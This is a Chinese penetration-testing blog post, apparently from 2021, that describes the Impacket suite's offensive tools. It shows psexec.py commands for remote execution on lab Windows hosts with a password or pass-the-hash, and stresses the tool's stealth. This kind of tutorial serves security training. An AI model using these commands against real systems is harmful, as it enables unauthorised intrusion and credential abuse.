@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <title>
+        IMPACKET套件使用 - AD钙奶的博客
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="横向移动" />
+    <meta name="generator" content="Hugo 0.87.0 with theme pure" />
+    <title>IMPACKET套件使用 - AD钙奶的博客</title>
+    
+    
+    <link rel="stylesheet" href="https://ad-calcium.github.io/css/style.min.e64d754037c0ee0ec4e20ab1d6f07740ace61729bc03850559b8caa21ae4a597.css">
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="IMPACKET套件使用" />
+<meta property="og:description" content="横向移动" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ad-calcium.github.io/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-09-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-09-04T00:00:00+00:00" />
+<meta property="og:see_also" content="https://ad-calcium.github.io/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/09/cve-2021-26084confluence-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/09/mimikatz%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/08/mssql%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BD%BF%E7%94%A8clr-bypass360/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/08/exchange2019%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" />
+
+<meta itemprop="name" content="IMPACKET套件使用">
+<meta itemprop="description" content="横向移动"><meta itemprop="datePublished" content="2021-09-04T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-09-04T00:00:00+00:00" />
+<meta itemprop="wordCount" content="6618">
+<meta itemprop="keywords" content="内网渗透,横向移动," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="IMPACKET套件使用"/>
+<meta name="twitter:description" content="横向移动"/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://github.com/ad-calcium" target="_blank">
+            <img class="img-circle img-rotate" src="https://ad-calcium.github.io/avatar.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">AD钙奶</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="想要查找什么..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><p>不忘初心方能始终</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div id="tag-cloud-list" class="widget-body">
+            
+            
+            <a href="https://ad-calcium.github.io/tags/confluence/" class="tag-list-link" rel="1">confluence<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/exchange/" class="tag-list-link" rel="2">exchange<span
+               class="tag-list-count">2</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link" rel="2">mssql<span
+               class="tag-list-count">2</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/mssql%E6%8F%90%E6%9D%83/" class="tag-list-link" rel="2">mssql提权<span
+               class="tag-list-count">2</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link" rel="5">web安全<span
+               class="tag-list-count">5</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="1">web渗透<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link" rel="3">内网<span
+               class="tag-list-count">3</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="3">内网渗透<span
+               class="tag-list-count">3</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/" class="tag-list-link" rel="1">凭据窃取<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/" class="tag-list-link" rel="1">安装博客<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="tag-list-link" rel="1">小技巧<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" class="tag-list-link" rel="1">未授权<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="tag-list-link" rel="1">横向移动<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="tag-list-link" rel="1">流量代理<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link" rel="12">漏洞复现<span
+               class="tag-list-count">12</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="tag-list-link" rel="1">软件安装<span
+               class="tag-list-count">1</span></a>
+            
+    </div>
+<script>
+document.onreadystatechange = () => {
+  if (document.readyState === 'complete') {
+    tagCloud('#tag-cloud-list a',  15 ,  30 );
+  }
+};
+
+function tagCloud(where, min, max) {
+  let iMax = 0;
+  let iMin = 0;
+  $(where).each(function() {
+    let weight = Number($(this).attr("rel"));
+    if(iMax < weight) iMax = weight;
+    if(iMin > weight || iMin == 0) iMin = weight;
+  });
+  let step = (max - min)/(iMax - iMin);
+  $(where).each(function() {
+    let weight = $(this).attr("rel") - iMin;
+    $(this).css({"font-size": min + (weight * step) + 'px'});
+  });
+};
+</script>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 分类</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/sql%E6%B3%A8%E5%85%A5/" class="category-list-link">sql注入</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/web%E5%AE%89%E5%85%A8/" class="category-list-link">web安全</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-list-link">内网渗透</a><span class="category-list-count">3</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/" class="category-list-link">凭据窃取</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="category-list-link">小技巧</a><span class="category-list-count">3</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="category-list-link">数据库</a><span class="category-list-count">2</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="category-list-link">未授权漏洞</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="category-list-link">横向移动</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-list-link">漏洞复现</a><span class="category-list-count">10</span></li>
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/confluence/" class="tag-list-link">confluence</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/exchange/" class="tag-list-link">exchange</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link">mssql</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/mssql%E6%8F%90%E6%9D%83/" class="tag-list-link">mssql提权</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link">web安全</a><span
+                    class="tag-list-count">5</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/" class="tag-list-link">web渗透</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link">内网</a><span
+                    class="tag-list-count">3</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link">内网渗透</a><span
+                    class="tag-list-count">3</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/" class="tag-list-link">凭据窃取</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/" class="tag-list-link">安装博客</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="tag-list-link">小技巧</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" class="tag-list-link">未授权</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="tag-list-link">横向移动</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="tag-list-link">流量代理</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link">漏洞复现</a><span
+                    class="tag-list-count">12</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="tag-list-link">软件安装</a><span
+                    class="tag-list-count">1</span></li>
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" class="title">IMPACKET套件使用</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-09-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-04</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="title">内网穿透工具的使用</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-09-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-04</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/09/cve-2021-26084confluence-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="title">CVE-2021-26084(Confluence) 漏洞复现</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-09-02 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-02</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/09/mimikatz%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" class="title">内网穿透工具的使用</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-09-02 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-02</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/08/mssql%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BD%BF%E7%94%A8clr-bypass360/" class="title">mssql提权之使用clr bypass360</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-08-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-08-21</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">文章目录</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/"
+    >IMPACKET套件使用</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://ad-calcium.github.io/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
+  <time datetime="2021-09-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-04</time>
+</a>
+</span>
+<span class="article-category">
+  <i class="icon icon-folder"></i>&nbsp;
+  <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> 内网渗透 </a>
+  <a class="article-category-link" href="/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"> 横向移动 </a>
+</span>  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> 内网渗透 </a>
+    <a class="article-tag-link" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"> 横向移动 </a>
+  </span>
+
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 6618字</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 14分 </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <h2 id="0x00-前言">0x00 前言</h2>
+<p>Impacket官方介绍为用于处理网络协议的Python类的集合，该集合包含了渗透测试中常见的工具种类，包括远程命令执行、信息收集、票据传递、凭据获取、中间人攻击测试等。该套件里的工具使用也是linux主机跳向windows主机的方式之一。</p>
+<h2 id="0x01-介绍">0x01 介绍</h2>
+<h3 id="impacket中包含以下协议">Impacket中包含以下协议</h3>
+<ul>
+<li>以太网，Linux“ Cooked”捕获。</li>
+<li>IP，TCP，UDP，ICMP，IGMP，ARP。</li>
+<li>IPv4和IPv6支持。</li>
+<li>NMB和SMB1，SMB2和SMB3（高级实现）。</li>
+<li>MSRPC版本5，通过不同的传输方式：TCP，SMB / TCP，SMB / NetBIOS和HTTP。</li>
+<li>使用密码/哈希/票证/密钥的普通，NTLM和Kerberos身份验证。</li>
+<li>以下MSRPC接口的部分/完全实现：EPM，DTYPE，LSAD，LSAT，NRPC，RRP，SAMR，SRVS，WKST，SCMR，DCOM，WMI</li>
+<li>TDS（MSSQL）和LDAP协议实现的部分。</li>
+</ul>
+<h3 id="impacket中包含以下工具">Impacket中包含以下工具</h3>
+<h4 id="远程执行"><em>远程执行</em></h4>
+<ul>
+<li>psexec.py：使用RemComSvc的PSEXEC类似功能示例。</li>
+<li>smbexec.py：一种与使用RemComSvc的PSEXEC。我们的实现更进一步，实例化一个本地smbserver来接收命令的输出。这在目标计算机没有可用的可写共享的情况下很有用。</li>
+<li>atexec.py：此示例通过Task Scheduler服务在目标计算机上执行命令，并返回已执行命令的输出。</li>
+<li>wmiexec.py：半交互式外壳，通过Windows Management Instrumentation使用。不需要在目标服务器上安装任何服务/代理。以管理员身份运行。高度隐秘。（可使用NTLM_hash登录）</li>
+<li>dcomexec.py：与wmiexec.py类似的半交互外壳，但使用不同的DCOM端点。当前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。</li>
+</ul>
+<h4 id="kerberos"><em>Kerberos</em></h4>
+<ul>
+<li>GetTGT.py：给定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache。</li>
+<li>GetST.py：在ccache中输入密码，哈希，aesKey或TGT后，此脚本将请求服务票证并将其另存为ccache。如果该帐户具有受约束的委派（具有协议转换）权限，则可以使用-impersonate开关代表另一个用户请求票证。</li>
+<li>GetPac.py：该脚本将仅具有经过身份验证的普通用户凭据，获取指定目标用户的PAC（特权属性证书）结构。通过混合使用MS-SFU]的S4USelf +用户到用户Kerberos身份验证来实现。</li>
+<li>GetUserSPNs.py：此示例将尝试查找和获取与普通用户帐户关联的服务主体名称。输出与JtR和HashCat兼容。</li>
+<li>GetNPUsers.py：此示例将尝试为那些设置了属性“不需要Kerberos预身份验证”（UF_DONT_REQUIRE_PREAUTH）的用户列出并获取TGT。输出与JtR兼容。</li>
+<li>ticketer.py：此脚本将从头开始或基于模板（从KDC合法请求）创建Golden / Silver票证，允许您自定义PAC_LOGON_INFO结构内设置的某些参数，尤其是组，ExtraSid，持续时间等。</li>
+<li>raiseChild.py：该脚本通过（ab）使用Golden Tickets和ExtraSids的概念来实现子域到森林特权的升级。</li>
+</ul>
+<h4 id="windows的秘诀"><em>Windows的</em>秘诀</h4>
+<ul>
+<li>secretsdump.py：执行各种技术以从远程计算机中转储秘密，而无需在该计算机上执行任何代理。对于SAM和LSA机密（包括缓存的凭据），我们尝试从注册表中读取尽可能多的内容，然后将配置单元保存在目标系统（％SYSTEMROOT％\ Temp目录）中，并从那里读取其余数据。对于DIT文件，我们使用DL_DRSGetNCChanges（）方法转储NTLM哈希，纯文本凭据（如果可用）和Kerberos密钥。它还可以通过使用smbexec / wmiexec方法执行的vssadmin转储NTDS.dit。如果脚本不可用，该脚本将启动其工作所需的服务（例如，即使已禁用，也应使用“远程注册表”）。工作完成后，一切恢复到原始状态。</li>
+<li>mimikatz.py：迷你外壳，用于控制由@gentilkiwi开发的远程mimikatz RPC服务器。</li>
+</ul>
+<h4 id="服务器工具-mitm攻击"><em>服务器工具/ MiTM攻击</em></h4>
+<ul>
+<li>ntlmrelayx.py：此脚本执行NTLM中继攻击，设置SMB和HTTP Server以及将凭据中继到许多不同的协议（SMB，HTTP，MSSQL，LDAP，IMAP，POP3等）。该脚本可以与预定义的攻击一起使用，这些预定义的攻击可以在中继连接时触发（例如，通过LDAP创建用户），或者可以以SOCKS模式执行。在这种模式下，对于每个中继的连接，以后可以通过SOCKS代理多次使用它。</li>
+<li>karmaSMB.py：不管指定的SMB共享和路径名如何，均可响应karmaSMB.py)特定文件内容的SMB服务器。</li>
+<li>smbserver.py：服务器的Python实现。允许快速设置共享和用户帐户。</li>
+</ul>
+<h4 id="wmi"><em>WMI</em></h4>
+<ul>
+<li>wmiquery.py：它允许发出WQL查询并获得目标系统上WMI对象的描述（例如，从win32_account中选择名称）。</li>
+<li>wmipersist.py：此脚本创建/删除WMI事件使用者/过滤器，并在两者之间建立链接，以基于指定的WQL过滤器或计时器执行Visual Basic。</li>
+</ul>
+<h4 id="已知漏洞"><em>已知漏洞</em></h4>
+<ul>
+<li>goldenPac.py：针对MS14-068的漏洞利用。保存黄金票，并在目标上启动PSEXEC会话。</li>
+<li>sambaPipe.py：此脚本将利用CVE-2017-7494，上载并执行用户通过-so参数指定的共享库。</li>
+<li>smbrelayx.py：使用SMB中继攻击来利用CVE-2015-0005。如果目标系统正在执行签名并且提供了计算机帐户，则模块将尝试通过NETLOGON收集SMB会话密钥。</li>
+</ul>
+<h4 id="smb--msrpc"><em>SMB / MSRPC</em></h4>
+<ul>
+<li>smbclient.py：一个通用的SMB客户端，可让您使用用户名和密码或用户名和哈希值的组合列出共享和文件，重命名，上传和下载文件以及创建和删除目录。这是了解如何在实际中使用impacket.smb的绝佳示例。</li>
+<li>getArch.py ：此脚本将连接到目标机器（或目标列表），并使用记录在案的MSRPC功能收集由（ab）安装的OS体系结构类型。</li>
+<li>rpcdump.py：此脚本将转储在目标处注册的RPC终结点和字符串绑定的列表。它还将尝试将它们与知名端点列表匹配。</li>
+<li>ifmap.py：此脚本将绑定到目标的MGMT接口以获取接口ID的列表。它将在野外看到的试图绑定到每个接口的另一个接口UUID列表的顶部使用该列表，并报告该接口是否已列出和/或正在侦听。</li>
+<li>opdump.py：这绑定到给定的主机名：端口和MSRPC接口。然后，它尝试依次调用前256个操作号中的每个操作号，并报告每个调用的结果。</li>
+<li>samrdump.py：一种与MSRPC套件中的“安全帐户管理器”远程接口进行通信的应用程序。它列出了系统用户帐户，可用资源份额以及通过此服务导出的其他敏感信息。</li>
+<li>services.py：此脚本可用于通过MS-SCMR] MSRPC接口来操作Windows服务。它支持开始，停止，删除，状态，配置，列表，创建和更改。</li>
+<li>netview.py：获取在远程主机上打开的会话的列表，并跟踪它们在找到的主机上循环，并跟踪谁从远程服务器登录/注销</li>
+<li>reg.py：通过MS-RRP] MSRPC接口的远程注册表操作工具。这个想法是提供与REG.py Windows实用程序类似的功能。</li>
+<li>lookupsid.py：通过MS-LSAT] MSRPC接口的Windows SID暴力实例，旨在查找远程用户/组。</li>
+</ul>
+<h4 id="mssql--tds"><em>MSSQL / TDS</em></h4>
+<ul>
+<li>mssqlinstance.py：从目标主机检索MSSQL实例名称。</li>
+<li>mssqlclient.py：一个MSSQL客户端，支持SQL和Windows身份验证（也有哈希）。它还支持TLS。</li>
+</ul>
+<h4 id="档案格式"><em>档案格式</em></h4>
+<ul>
+<li>esentutl.py：一种Extensibe Storage Engine格式的实现。允许转储ESE数据库的目录，页面和表（例如NTDS.dit）</li>
+<li>ntfs-read.py：NTFS格式的实现。该脚本提供了一个迷你外壳，用于浏览和提取NTFS卷，包括隐藏/锁定的内容。</li>
+<li>registry-read.py：一个Windwows注册表文件格式实现。它允许解析脱机注册表配置单元。</li>
+</ul>
+<h4 id="其他"><em>其他</em></h4>
+<ul>
+<li>GetADUsers.py：此脚本将收集有关域用户及其对应电子邮件地址的数据。它还将包含有关上次登录和上次密码设置属性的一些额外信息。</li>
+<li>mqtt_check.py：简单的MQTT示例，旨在使用不同的登录选项。可以很容易地转换为帐户/密码蛮力。</li>
+<li>rdp_check.py：MS-RDPBCGR和MS-CREDSSP]部分实现只是为了达到CredSSP身份验证。本示例测试帐户在目标主机上是否有效。</li>
+<li>sniff.py：简单的数据包嗅探器，它使用pcapy库来侦听＃通过指定接口传输的数据包。</li>
+<li>sniffer.py：简单的数据包嗅探器，它使用原始套接字侦听与指定协议相对应的传输中的数据包。</li>
+<li>ping.py：使用ICMP回显和回显应答包检查主机状态的简单ICMP ping。如果远程主机已启动，则它应使用echo-r eply数据包回复echo探测。</li>
+<li>ping6.py：使用ICMP回显和回显应答包检查主机状态的简单IPv6 ICMP ping。</li>
+</ul>
+<h2 id="0x02-基本使用">0x02 基本使用</h2>
+<h3 id="psexec">psexec</h3>
+<p>psexec.py始于微软的pstools套件， 用于管理员远程管理windows主机资产，在渗透测试中也经常用来对远程计算机执行命令。</p>
+<p>与微软官方的psexec.py做对比，官方psexec.py执行远程命令会在远程主机创建一个PSEXEC的服务，并且命令执行后会一直存在，容易被管理人员发现并判断有入侵行为。impacket套件内的psexec，执行命令之后会删除对应的服务，隐蔽性更佳，而且impacket套件内的psexec支持PTH(哈希传递)。</p>
+<p>与官方psexec相同，impacket套件内的psexec也支持&quot;-c&quot;参数，参数解释如下，即复制本地可执行文件到远程主机并执行</p>
+<h4 id="本地账号密码认证">本地账号密码认证</h4>
+<pre><code>python3 psexec.py ./administrator:123456@10.10.10.120
+</code></pre>
+<p>在psexec执行过程中，在远程主机10.10.10.120查看服务，发现创建了一个fZWPvIyH.py的服务</p>
+<p><img src="images/image-20210903222321394.png" alt="image-20210903222321394"></p>
+<h4 id="ntlm-hash认证">NTLM HASH认证</h4>
+<pre><code>python3 psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120
+</code></pre>
+<p><img src="images/image-20210903222524328.png" alt="image-20210903222524328"></p>
+<h4 id="域管账号密码认证">域管账号密码认证</h4>
+<pre><code>python3 psexec.py adlab/administrator:123456@10.10.10.250
+</code></pre>
+<p><img src="images/image-20210903222641323.png" alt="image-20210903222641323"></p>
+<h4 id="域内使用ntlm-hash认证对远程主机">域内使用NTLM hash认证对远程主机</h4>
+<pre><code>python3 psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/administrator@10.10.10.250
+</code></pre>
